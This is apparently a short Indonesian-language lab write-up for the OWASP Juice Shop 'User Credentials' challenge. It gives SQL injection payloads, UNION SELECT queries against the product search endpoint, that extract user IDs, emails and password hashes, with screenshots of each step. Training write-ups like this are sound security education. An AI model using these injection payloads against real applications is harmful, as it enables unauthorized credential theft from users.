# Juice-Shop: User Credentials

1. Untuk mengambil semua kredensial user, pakai endpoint yang digunakan, yaitu /rest/products/search?q=, tempat dipakainya UNION SELECT menggunakan tabel pengguna

```sql
')) UNION SELECT 1,2,3,4,5,6,7,8,9 FROM users--
```

![Soal 4](<../img/soal4%20(1).png>)

2. Periksa nama kolom dan mencoba seperti id, email, kata sandi dalam parameter.

```sql
')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM users--
```

![Soal 4](<../img/soal4%20(2).png>)

Masih belum terfilter sekarang gunakan queery dibawah

```sql
p')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM users--
```

![Soal 4](<../img/soal4%20(3).png>)

3. Berhasil

![Soal 4](<../img/soal4%20(4).png>)
